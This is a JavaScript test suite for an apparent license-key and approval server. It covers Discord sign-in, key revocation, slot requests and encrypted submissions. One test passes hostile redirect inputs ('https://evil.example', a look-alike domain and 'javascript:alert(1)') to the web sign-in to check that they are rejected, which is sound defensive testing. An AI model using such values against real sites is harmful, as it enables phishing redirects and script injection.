    assert.ok(html.includes(s.key), "callback page shows the key");
    const b = await verifyList(s.list);
    assert.deepEqual(b.keys.map((k) => k.h), [await keyHash(s.key)]);
    assert.ok(b.issued > firstIssued, "a changed list has a later issued time");
    aliceKey = s.key;
  });
  await test("owner's channel is told about the new key (without the key)", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
    assert.match(webhookPosts[0].content, /@alice/);
    assert.ok(!webhookPosts[0].content.includes(aliceKey));
    assert.ok(!webhookPosts[0].content.includes("<@"), "no NOTIFY_USER_ID, no ping");
    assert.deepEqual(webhookPosts[0].allowed_mentions, { parse: [] });
  });
  await test("the same Discord account gets the same key again", async () => {
    const r = rid();
    await signIn(r, "alice");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.key, aliceKey);
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1, "no second notice");
  });
  await test("reloading the callback page doesn't redo anything", async () => {
    const r = rid();
    const { state } = await signIn(r, "bob");
    const again = await get(`/discord/callback?state=${state}&code=bob`);
    assert.equal(again.status, 200);
    const html = await again.text();
    assert.match(html, /all set/);
    assert.match(html, /<title>FAFO · You&#39;re all set<\/title>/); assert.match(html, /<h1>FAFO<\/h1>/); assert.match(html, /family=Bruno\+Ace\+SC&text=FAFO/);
    assert.match(html, /Go back to FAFO/); assert.doesNotMatch(html, /Orbit/);
    const b = await verifyList(await getJson("/licenses"));
    assert.equal(b.keys.length, 2);
  });
  await test("a list with no changes isn't re-signed", async () => {
    const a = await getJson("/licenses"), b = await getJson("/licenses");
    assert.equal(a.body, b.body); assert.equal(a.sig, b.sig);
  });
  // From page 1.9.111 the web version sends its address (`web`), so the page Discord sends the buyer back to takes them
  // back to FAFO there; any other value is ignored, and the desktop app's sign-in is as before.
  const webSignIn = async (r, code, web, extra = "") => {
    const start = await get("/discord/start?r=" + r + "&web=" + encodeURIComponent(web));
    assert.equal(start.status, 302);
    const loc = new URL(start.headers.get("location"));
    const state = loc.searchParams.get("state");
    return { loc, state, page: await get(`/discord/callback?state=${encodeURIComponent(state)}${code ? "&code=" + code : ""}${extra}`) };
  };
  await test("a sign-in from the web version offers Back to FAFO on its address", async () => {
    const r = rid();
    const { loc, state, page } = await webSignIn(r, "alice", "https://app.fafoaco.com");
    assert.equal(loc.searchParams.get("redirect_uri"), BASE + "/discord/callback", "Discord sends it back as before");
    assert.match(state, /\.w0$/);
    assert.equal(page.status, 200);
    const html = await page.text();
    assert.match(html, /You&#39;re all set/); assert.match(html, /your master password opens your vault there, or you choose one if you&#39;re new/);
    assert.match(html, /<button class="go" id="back" type="button">Back to FAFO<\/button>/);
    assert.ok(html.includes('location.replace("https://app.fafoaco.com/")'), "opens the web version it came from");
    assert.ok(html.includes("history.length < 2"), "a tab FAFO didn't open (one page of history) goes to FAFO rather than closing");
    assert.match(html, /Signed in from the Discord app or another browser\? Go back to FAFO there\./);
    assert.ok(html.includes(aliceKey), "still shows the key");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued"); assert.equal(s.key, aliceKey);
    const again = await (await get(`/discord/callback?state=${encodeURIComponent(state)}&code=alice`)).text();
    assert.match(again, /Back to FAFO/); assert.match(again, /FAFO has your key/);
  });
  await test("the old web address gets its own way back, and anything else is ignored", async () => {
    const old = await webSignIn(rid(), "alice", "https://app.orbit-app.workers.dev");
    assert.match(old.state, /\.w1$/);
    assert.ok((await old.page.text()).includes('location.replace("https://app.orbit-app.workers.dev/")'));
    for (const web of ["https://evil.example", "https://app.fafoaco.com.evil.example", "javascript:alert(1)", ""]) {
      const x = await webSignIn(rid(), "alice", web);
      assert.doesNotMatch(x.state, /\./, web);
      const html = await x.page.text();
      assert.doesNotMatch(html, /Back to FAFO/, web); assert.match(html, /Go back to FAFO\. It activates by itself/, web);
    }
    const desk = await signIn(rid(), "alice");
    assert.doesNotMatch(await desk.page.text(), /Back to FAFO|<script/, "the desktop app's page is as before");
  });
  await test("a cancelled web sign-in also offers the way back", async () => {
    const r = rid();
    const { page } = await webSignIn(r, "", "https://app.fafoaco.com", "&error=access_denied");
    assert.equal(page.status, 400);
    const html = await page.text();
    assert.match(html, /Sign-in cancelled/); assert.match(html, /Back to FAFO/);
    assert.equal((await getJson("/discord/status/" + r)).status, "error");
  });
  await test("a web sign-in's page loaded again (a phone reloading the tab) keeps the way back", async () => {
    const r = rid();
    const { state } = await webSignIn(r, "", "https://app.fafoaco.com", "&error=access_denied");
    const again = await (await get(`/discord/callback?state=${encodeURIComponent(state)}&error=access_denied`)).text();
    assert.match(again, /Something went wrong/); assert.match(again, /Back to FAFO/);
    const gone = await (await get(`/discord/callback?state=${encodeURIComponent(state.replace(/^./, "x"))}&code=alice`)).text();
    assert.match(gone, /This sign-in expired/); assert.match(gone, /Back to FAFO/, "the address still says where it came from");
    const desk = await get(`/discord/callback?state=nope&code=alice`);
    assert.doesNotMatch(await desk.text(), /Back to FAFO/);
  });
  await test("cancelled sign-in reports an error to the app", async () => {
    const r = rid();
    const { page } = await signIn(r, "", "&error=access_denied");
    assert.equal(page.status, 400);
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /cancelled/);
  });
  await test("bad code from Discord is an error", async () => {
    const r = rid();
    const { page } = await signIn(r, "nobody");
    assert.equal(page.status, 502);
    assert.equal((await getJson("/discord/status/" + r)).status, "error");
  });
  await test("bots are turned away", async () => {
    const r = rid(); await signIn(r, "robot");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /Bot/);
  });
  await test("accounts younger than MIN_ACCOUNT_AGE_DAYS are turned away", async () => {
    const r = rid(); await signIn(r, "fresh");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /30 days/);
  });
  await test("non-members of REQUIRED_GUILD_ID are turned away", async () => {
    const r = rid(); await signIn(r, "outsider");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /member/);
  });
  await test("unknown state and unknown request id", async () => {
    assert.equal((await get("/discord/callback?state=nope&code=alice")).status, 400);
    assert.equal((await get("/discord/status/" + rid())).status, 404);
  });
  await test("admin needs the token", async () => {
    assert.equal((await get("/admin/licenses")).status, 401);
    assert.equal((await get("/admin/licenses", { headers: { authorization: "Bearer wrong" } })).status, 401);
  });
  await test("admin lists issued keys", async () => {
    const { licenses } = await (await admin("/admin/licenses")).json();
    assert.deepEqual(licenses.map((l) => l.username).sort(), ["alice", "bob"]);
  });
  await test("revoking a key removes it from the signed list", async () => {
    const before = await verifyList(await getJson("/licenses"));
    assert.deepEqual(await (await admin("/admin/revoke", { key: aliceKey.toLowerCase() })).json(), { ok: true, changed: 1 });
    const after = await verifyList(await getJson("/licenses"));
    assert.ok(!after.keys.some((k) => k.h === before.keys[0].h));
    assert.equal(after.keys.length, 1);
    assert.ok(after.issued > before.issued);
  });
  await test("a revoked account can't get its key back by signing in", async () => {
    const r = rid(); const { page } = await signIn(r, "alice");
    assert.equal(page.status, 403);
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "error"); assert.match(s.error, /turned off/);
  });
  await test("restoring a key puts it back", async () => {
    await admin("/admin/restore", { discord_id: USERS.alice.id });
    const b = await verifyList(await getJson("/licenses"));
    const h = await keyHash(aliceKey);
    assert.ok(b.keys.some((k) => k.h === h));
    assert.equal(b.keys.length, 2);
  });
  await test("too many starts from one address are refused", async () => {
    let last;
    for (let i = 0; i < 25; i++) last = await get("/discord/start?r=" + rid());
    assert.equal(last.status, 429);
  });

  console.log("\nApproval mode");
  await startWorker("approval", APPROVAL_PORT, ["REQUIRE_APPROVAL=true", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", `NOTIFY_USER_ID=${OWNER}, not-an-id, ${OWNER}`]);
  webhookPosts.length = 0;
  let carolR, carolLink, carolKey;
  const reviewPost = (link, action, t) => fetch(link.split("?")[0], { method: "POST", redirect: "manual",
    body: new URLSearchParams({ t: t ?? new URL(link).searchParams.get("t"), action }) });
  const linkIn = (content) => (content.match(/\((http[^)]+\/review\/[^)]+)\)/) || [])[1];
  await test("sign-in creates a request instead of a key", async () => {
    carolR = rid();
    const { page } = await signIn(carolR, "carol");
    assert.equal(page.status, 200);
    assert.match(await page.text(), /Request sent/);
    const s = await getJson("/discord/status/" + carolR);
    assert.equal(s.status, "review"); assert.match(s.error, /approves/);
    assert.equal(s.key, undefined);
    assert.deepEqual((await verifyList(await getJson("/licenses"))).keys, []);
  });
  await test("a web sign-in waiting for approval says so, with the way back", async () => {
    await new Promise((r) => setTimeout(r, 300));
    const before = webhookPosts.length, r = rid();
    const start = await get("/discord/start?r=" + r + "&web=" + encodeURIComponent("https://app.fafoaco.com"));
    const state = new URL(start.headers.get("location")).searchParams.get("state");
    const html = await (await get(`/discord/callback?state=${encodeURIComponent(state)}&code=carol`)).text();
    assert.match(html, /Request sent/); assert.match(html, /approves new accounts by hand/); assert.match(html, /Back to FAFO/);
    assert.equal((await getJson("/discord/status/" + r)).status, "review");
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, before, "asking again doesn't post again");
    // Later tests on this database use up the hour's sign-ins from this address: this one doesn't count toward them.
    execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, "approval"), "--command",
      `UPDATE requests SET created_at = created_at - 7200000 WHERE r = '${r}'`], { cwd: root, env, stdio: "pipe" });
    // Its page reloaded two hours on (still waiting for the seller) isn't "expired".
    // The connection may have closed while the database was read: tried once more then (as fetchOnce does further on).
    const again = () => get(`/discord/callback?state=${encodeURIComponent(state)}&code=carol`);
    const later = await (await again().catch(again)).text();
    assert.match(later, /Request sent/); assert.doesNotMatch(later, /expired/); assert.match(later, /Back to FAFO/);
  });
  await test("the request is posted to the owner's channel with a review link", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
    const m = webhookPosts[0];
    assert.equal(m.wait, "true"); assert.equal(m.flags, 4);
    assert.match(m.content, /New FAFO key request/);
    assert.match(m.content, /@carol\\_x/, "username markdown is escaped");
    assert.match(m.content, new RegExp("Discord ID " + USERS.carol.id));
    assert.ok(m.content.startsWith(`<@${OWNER}> 📝`), "NOTIFY_USER_ID is pinged first: " + m.content);
    assert.deepEqual(m.allowed_mentions, { parse: [], users: [OWNER] }, "and nobody else can be");
    carolLink = linkIn(m.content);
    assert.ok(carolLink.startsWith(BASE + "/review/" + USERS.carol.id + "?t="));
  });
  await test("signing in again while waiting doesn't post again", async () => {
    const r = rid(); await signIn(r, "carol");
    assert.equal((await getJson("/discord/status/" + r)).status, "review");
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 1);
  });
  await test("the review page shows the request and changes nothing by itself", async () => {
    const res = await fetch(carolLink);
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.match(html, /@carol_x/); assert.match(html, /Waiting for your decision/);
    assert.doesNotMatch(html, /PVLT-/, "no key before approval");
    assert.match(html, /value="approve"/); assert.match(html, /value="deny"/);
    assert.equal((await getJson("/discord/status/" + carolR)).status, "review");
  });
  await test("a wrong or missing review token is refused", async () => {
    assert.equal((await fetch(carolLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
    assert.equal((await fetch(BASE + "/review/" + USERS.carol.id)).status, 404);
    assert.equal((await reviewPost(carolLink, "approve", "wrong")).status, 404);
    assert.equal((await getJson("/discord/status/" + carolR)).status, "review");
  });
  await test("approving issues the key, and the waiting app picks it up", async () => {
    const res = await reviewPost(carolLink, "approve");
    assert.equal(res.status, 200); assert.match(await res.text(), /Approved/);
    const s = await getJson("/discord/status/" + carolR);
    assert.equal(s.status, "issued"); assert.match(s.key, /^PVLT-/);
    assert.ok((await (await fetch(carolLink)).text()).includes(s.key), "review page shows the key once approved");
    const b = await verifyList(s.list);
    assert.deepEqual(b.keys.map((k) => k.h), [await keyHash(s.key)]);
    carolKey = s.key;
  });
  await test("the channel message is updated with the decision", async () => {
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookEdits.length, 1);
    assert.equal(webhookEdits[0].id, webhookPosts[0].id);
    assert.match(webhookEdits[0].content, /Approved/);
    assert.equal(linkIn(webhookEdits[0].content), carolLink, "link still there to change the decision");
    assert.equal(webhookPosts.length, 1, "no separate 'key issued' notice");
    assert.ok(!webhookEdits[0].content.includes("<@"), "a decision doesn't ping again");
    assert.deepEqual(webhookEdits[0].allowed_mentions, { parse: [] });
  });
  await test("once approved, signing in gives the key straight away", async () => {
    const r = rid(); await signIn(r, "carol");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued"); assert.equal(s.key, carolKey);
  });
  let daveR, daveLink;
  await test("denying tells the app the request was declined", async () => {
    daveR = rid(); await signIn(daveR, "dave");
    await new Promise((r) => setTimeout(r, 300));
    daveLink = linkIn(webhookPosts[1].content);
    const res = await reviewPost(daveLink, "deny");
    assert.match(await res.text(), /Denied/);
    const s = await getJson("/discord/status/" + daveR);
    assert.equal(s.status, "error"); assert.match(s.error, /declined/);
    await new Promise((r) => setTimeout(r, 300));
    assert.match(webhookEdits.at(-1).content, /Denied/);
  });
  await test("a denied account signing in again is told, without a new post", async () => {
    const r = rid(); const { page } = await signIn(r, "dave");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(webhookPosts.length, 2);
  });
  await test("changing a denial to approval issues the key", async () => {
    await reviewPost(daveLink, "approve");
    const r = rid(); await signIn(r, "dave");
    assert.equal((await getJson("/discord/status/" + r)).status, "issued");
  });
  await test("denying after approval turns the key off", async () => {
    await reviewPost(carolLink, "deny");
    const b = await verifyList(await getJson("/licenses"));
    const h = await keyHash(carolKey);
    assert.ok(!b.keys.some((k) => k.h === h));
    const r = rid(); const { page } = await signIn(r, "carol");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
    assert.doesNotMatch(await (await fetch(carolLink)).text(), /PVLT-/, "no key once denied");
  });
  await test("admin lists requests and decisions, with working review links", async () => {
    const { applications } = await (await admin("/admin/applications")).json();
    assert.deepEqual(applications.map((a) => [a.username, a.status]).sort(), [["carol_x", "denied"], ["dave", "approved"]]);
    const dave = applications.find((a) => a.username === "dave");
    assert.equal(dave.review_token, undefined);
    assert.equal(dave.review_url, daveLink);
    assert.equal((await fetch(dave.review_url)).status, 200);
  });
  await test("a request whose channel post failed is posted again on the next sign-in", async () => {
    const before = webhookPosts.length;
    webhookFail.push(500);
    const r1 = rid(); await signIn(r1, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before, "first post failed");
    assert.equal((await getJson("/discord/status/" + r1)).status, "review");
    const r2 = rid(); await signIn(r2, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content, /@erin/);
    const r3 = rid(); await signIn(r3, "erin");
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(webhookPosts.length, before + 1, "not posted again once it went through");
  });
  await test("a rate-limited post waits as Discord asks and goes through", async () => {
    const before = webhookPosts.length;
    webhookFail.push(429);
    await signIn(rid(), "gina");
    await new Promise((r) => setTimeout(r, 1500));
    assert.equal(webhookPosts.length, before + 1);
    assert.match(webhookPosts.at(-1).content, /@gina/);
  });
  await test("denying someone before they had a key", async () => {
    const erinLink = linkIn(webhookPosts.find((m) => /@erin/.test(m.content)).content);
    await reviewPost(erinLink, "deny");
    const r = rid(); const { page } = await signIn(r, "erin");
    assert.equal(page.status, 403);
  });

  console.log("\nApproval switched off again, same database");
  stopWorker(workers.pop());
  await new Promise((r) => setTimeout(r, 1500));
  await startWorker("approval-off", APPROVAL_PORT + 1, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0"], "approval");
  await test("denied accounts stay declined", async () => {
    const r = rid(); const { page } = await signIn(r, "erin");
    assert.equal(page.status, 403);
    assert.match((await getJson("/discord/status/" + r)).error, /declined/);
  });
  let frankKey;
  await test("new accounts get a key straight away again", async () => {
    const r = rid(); await signIn(r, "frank");
    const s = await getJson("/discord/status/" + r);
    assert.equal(s.status, "issued"); assert.match(s.key, /^PVLT-/);
    frankKey = s.key;
  });

  console.log("\nSlots");
  const slots = (path, key, body) => fetch(BASE + path, { method: body ? "POST" : "GET", headers: { ...(key ? { authorization: "Bearer " + key } : {}), "content-type": "application/json" }, body: body && JSON.stringify(body) });
  const slotLink = (content) => (content.match(/\((http[^)]+\/slots\/review\/[^)]+)\)/) || [])[1];
  const slotPost = (link, action, amount) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action, ...(amount != null ? { amount: String(amount) } : {}) }) });
  let frankLink;
  await test("the limit needs a valid license key", async () => {
    assert.equal((await slots("/slots/limit")).status, 401);
    assert.equal((await slots("/slots/limit", "PVLT-AAAA-BBBB-CCCC-DDDD")).status, 401);
    assert.equal((await slots("/slots/limit", "not a key")).status, 401);
  });
  await test("everyone starts at 20 slots", async () => {
    assert.deepEqual(await (await slots("/slots/limit", frankKey)).json(), { limit: 20, request: null, canRequest: true });
  });
  await test("keys made by hand (the GitHub list) work too", async () => {
    assert.equal((await (await slots("/slots/limit", GH_KEY.toLowerCase())).json()).limit, 20);
  });
  await test("asking for fewer slots than you have, or too many, is refused", async () => {
    assert.equal((await slots("/slots/request", frankKey, { requested: 20 })).status, 400);
    assert.equal((await slots("/slots/request", frankKey, { requested: 501 })).status, 400);
    assert.equal((await slots("/slots/request", frankKey, { requested: "lots" })).status, 400);
  });
  await test("a request is posted to the owner's channel with a review link", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/slots/request", frankKey, { requested: 40, name: "Frank_the_*shopper*", note: "Big drop\nthis weekend" })).json();
    assert.equal(r.status, "pending"); assert.equal(r.request.requested, 40);
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, /More slots requested/); assert.match(m, /20 → 40 slots/);
    assert.match(m, /Frank\\_the\\_\\\*shopper\\\*/, "name is markdown-escaped");
    assert.match(m, /@frank/); assert.match(m, new RegExp("license …" + frankKey.slice(-4)));
    assert.match(m, /Big drop this weekend/, "note kept on one line");
    frankLink = slotLink(m);
    assert.ok(frankLink.startsWith(BASE + "/slots/review/"));
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 20); assert.equal(lim.request.status, "pending");
  });
  await test("asking again while one is waiting doesn't post again", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/slots/request", frankKey, { requested: 60 })).json();
    assert.equal(r.status, "pending"); assert.equal(r.request.requested, 40);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before);
  });
  await test("the review page needs the right token and changes nothing by itself", async () => {
    assert.equal((await fetch(frankLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await slotPost(frankLink.replace(/t=[^&]+/, "t=nope"), "approve")).status, 404);
    const html = await (await fetch(frankLink)).text();
    assert.match(html, /asked for <strong>40<\/strong>/); assert.match(html, /Waiting for your decision/);
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 20);
  });
  await test("approving can grant a different number, and the channel message is updated", async () => {
    const res = await slotPost(frankLink, "approve", 35);
    assert.match(await res.text(), /can now use 35 slots/);
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 35); assert.equal(lim.request.status, "approved"); assert.equal(lim.request.granted, 35);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Approved: 35 slots/);
  });
  await test("an out-of-range amount is refused on the review page", async () => {
    assert.match(await (await slotPost(frankLink, "approve", 0)).text(), /between 1 and 500/);
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 35);
  });
  await test("denying after approving puts the limit back", async () => {
    await slotPost(frankLink, "deny");
    const lim = await (await slots("/slots/limit", frankKey)).json();
    assert.equal(lim.limit, 20); assert.equal(lim.request.status, "denied");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Slot request denied/);
  });
  await test("a denied request can be approved later", async () => {
    await slotPost(frankLink, "approve");
    assert.equal((await (await slots("/slots/limit", frankKey)).json()).limit, 40);
  });
  await test("a revoked key can't ask or read its limit", async () => {
    await admin("/admin/revoke", { key: frankKey });
    assert.equal((await slots("/slots/limit", frankKey)).status, 401);
    assert.equal((await slots("/slots/request", frankKey, { requested: 80 })).status, 401);
    await admin("/admin/restore", { key: frankKey });
  });
  await test("at most 3 requests a day per license", async () => {
    for (const n of [41, 42]){
      const r = await (await slots("/slots/request", frankKey, { requested: n })).json();
      assert.equal(r.status, "pending");
      const link = slotLink(await new Promise((ok) => setTimeout(() => ok(webhookPosts.at(-1).content), 300)));
      await slotPost(link, "deny");
    }
    assert.equal((await slots("/slots/request", frankKey, { requested: 43 })).status, 429);
  });
  await test("admin lists limits and requests with review links", async () => {
    const d = await (await admin("/admin/slots")).json();
    assert.equal(d.default, 20);
    assert.equal(d.limits.length, 1); assert.equal(d.limits[0].slot_limit, 40);
    assert.equal(d.requests.length, 3);
    assert.ok(d.requests.every((q) => q.review_url.includes("/slots/review/") && q.review_token === undefined && q.key_hash === undefined));
  });
  console.log("\nSubmissions");
  const b64u = (b) => Buffer.from(b).toString("base64url");
  const newCollectKey = async () => {
    const kp = await crypto.subtle.generateKey({ name: "ECDH", namedCurve: "P-256" }, true, ["deriveBits"]);
    const raw = new Uint8Array(await crypto.subtle.exportKey("raw", kp.publicKey));
    const h = new Uint8Array(await crypto.subtle.digest("SHA-256", raw));
    const hex = Buffer.from(h).toString("hex").toUpperCase();
    return { pub: b64u(raw), keyId: hex.slice(0, 4) + "-" + hex.slice(4, 8), fingerprint: hex.slice(0, 32).match(/.{4}/g).join(" ") };
  };
  const fakeCode = (n = 200) => "PVSUB1." + b64u(crypto.getRandomValues(new Uint8Array(65))) + "." + b64u(crypto.getRandomValues(new Uint8Array(12))) + "." + b64u(crypto.getRandomValues(new Uint8Array(n)));
  const keyLink = (content) => (content.match(/\((http[^)]+\/submit\/review\/[^)]+)\)/) || [])[1];
  const keyPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const ownerKey = await newCollectKey(), otherKey = await newCollectKey();
  let ownerLink;
  await test("there's no collecting key until the owner confirms one", async () => {
    assert.deepEqual(await getJson("/submit/key"), { pub: null, keyId: null });
    const r = await slots("/submissions", frankKey, { code: fakeCode(), keyId: ownerKey.keyId, slots: 1 });
    assert.equal(r.status, 409); assert.equal((await r.json()).error, "no collecting key");
  });
  await test("offering a key needs a license and a real P-256 key", async () => {
    assert.equal((await slots("/submit/key", null, { pub: ownerKey.pub })).status, 401);
    assert.equal((await slots("/submit/key", frankKey, { pub: "nope" })).status, 400);
    const bad = Buffer.from(ownerKey.pub, "base64url"); bad[64] ^= 1;   // no longer a point on the curve
    assert.equal((await slots("/submit/key", frankKey, { pub: b64u(bad) })).status, 400);
  });
  await test("an offer whose post failed is posted when the app offers it again", async () => {
    const k = await newCollectKey();
    webhookFail.push(500);
    assert.equal((await (await slots("/submit/key", frankKey, { pub: k.pub })).json()).status, "pending");
    await new Promise((ok) => setTimeout(ok, 400));
    const before = webhookPosts.length;
    assert.equal((await (await slots("/submit/key", frankKey, { pub: k.pub })).json()).status, "pending");
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    await keyPost(keyLink(webhookPosts.at(-1).content), "deny");
  });
  await test("an offered key is posted to the channel with its key ID, and isn't used yet", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub, name: "Owner" })).json();
    assert.deepEqual(r, { status: "pending", keyId: ownerKey.keyId });
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1).content;
    assert.match(m, new RegExp("with key " + ownerKey.keyId)); assert.match(m, /Only confirm if the key ID and fingerprint on the review page match your own FAFO/);
    ownerLink = keyLink(m); assert.ok(ownerLink);
    assert.equal((await getJson("/submit/key")).pub, null);
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "pending");
    const again = await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub })).json();
    assert.equal(again.status, "pending");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal(webhookPosts.length, before + 1, "not posted twice");
  });
  await test("the key review page needs its token and changes nothing by itself", async () => {
    assert.equal((await fetch(ownerLink.replace(/t=[^&]+/, "t=nope"))).status, 404);
    assert.equal((await keyPost(ownerLink.replace(/t=[^&]+/, "t=nope"), "confirm")).status, 404);
    const html = await (await fetch(ownerLink)).text();
    assert.match(html, new RegExp(ownerKey.keyId)); assert.match(html, new RegExp(ownerKey.fingerprint)); assert.match(html, /Waiting for you/);
    assert.equal((await getJson("/submit/key")).pub, null);
  });
  await test("confirming makes it the key everyone's Orbit encrypts to", async () => {
    assert.match(await (await keyPost(ownerLink, "confirm")).text(), /Confirmed/);
    assert.deepEqual(await getJson("/submit/key"), { pub: ownerKey.pub, keyId: ownerKey.keyId, fingerprint: ownerKey.fingerprint });
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "active");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Submissions now arrive here/);
    assert.equal((await (await slots("/submit/key", GH_KEY, { pub: ownerKey.pub })).json()).status, "active");
  });
  let code;
  await test("a submission is posted as an attachment, with only the sealed code in it", async () => {
    code = fakeCode(3000);
    const before = webhookPosts.length;
    const r = await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, name: "Frank *F*", slots: 3, stores: [{ name: "Target", n: 2 }, { name: "Best_Buy", n: 1 }] });
    assert.equal(r.status, 200); assert.equal((await r.json()).ok, true);
    assert.equal(webhookPosts.length, before + 1);
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\*\*3 slots\*\* from \*\*Frank \\\*F\\\*\*\* · @frank · license …/);
    assert.match(m.content, /Target 2 · Best\\_Buy 1/); assert.match(m.content, new RegExp("key " + ownerKey.keyId));
    assert.equal(m.files.length, 1); assert.equal(m.files[0].text, code);
    assert.match(m.files[0].name, /^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-Frank-F\.txt$/);
    assert.equal(m.allowed_mentions.parse.length, 0);
  });
  await test("submissions need a license, a sealed code and the current key", async () => {
    assert.equal((await slots("/submissions", null, { code, keyId: ownerKey.keyId, slots: 1 })).status, 401);
    assert.equal((await slots("/submissions", frankKey, { code: '{"cards":[]}', keyId: ownerKey.keyId, slots: 1 })).status, 400);
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 0 })).status, 400);
    const r = await slots("/submissions", frankKey, { code, keyId: otherKey.keyId, slots: 1 });
    assert.equal(r.status, 409);
    assert.deepEqual(await r.json(), { error: "key changed", pub: ownerKey.pub, keyId: ownerKey.keyId });
  });
  await test("sending the same batch again (its answer got lost) doesn't post it twice", async () => {
    const batch = "batch" + rid();
    const before = webhookPosts.length;
    const first = await (await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 2, batch })).json();
    assert.deepEqual(first, { ok: true, id: batch, review: "pending" });
    const again = await (await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 2, batch })).json();
    assert.equal(again.ok, true); assert.equal(again.duplicate, true); assert.equal(again.review, "pending");
    assert.equal(webhookPosts.length, before + 1);
    assert.equal((await slots("/submissions", GH_KEY, { code, keyId: ownerKey.keyId, slots: 2, batch })).status, 409, "another license can't reuse it");
  });
  await test("if the channel refuses the post, the app is told", async () => {
    webhookFail.push(500);
    const batch = "failing" + rid();
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1, batch })).status, 502);
    const before = webhookPosts.length;
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1, batch })).status, 200, "and trying again posts it");
    assert.equal(webhookPosts.length, before + 1);
  });
  await test("a new key replaces the old one once confirmed", async () => {
    await slots("/submit/key", frankKey, { pub: otherKey.pub });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = keyLink(webhookPosts.at(-1).content);
    assert.equal((await getJson("/submit/key")).keyId, ownerKey.keyId, "old key stays until confirmed");
    await keyPost(link, "confirm");
    assert.equal((await getJson("/submit/key")).keyId, otherKey.keyId);
    assert.equal((await getJson("/submit/key?pub=" + ownerKey.pub)).mine, "replaced");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.ok(webhookEdits.some((e) => /replaced by a newer one/.test(e.content)));
    await keyPost(ownerLink, "confirm");
    assert.equal((await getJson("/submit/key")).keyId, ownerKey.keyId, "the owner can switch back");
  });
  await test("stopping the key stops submissions", async () => {
    await keyPost(ownerLink, "deny");
    assert.equal((await getJson("/submit/key")).pub, null);
    assert.equal((await slots("/submissions", frankKey, { code, keyId: ownerKey.keyId, slots: 1 })).status, 409);
    await keyPost(ownerLink, "confirm");
  });
  await test("at most 30 submissions an hour per license", async () => {
    const small = fakeCode();
    for (let i = 0; i < 29; i++) assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 200);
    assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 200);
    assert.equal((await slots("/submissions", GH_KEY, { code: small, keyId: ownerKey.keyId, slots: 1 })).status, 429);
  });
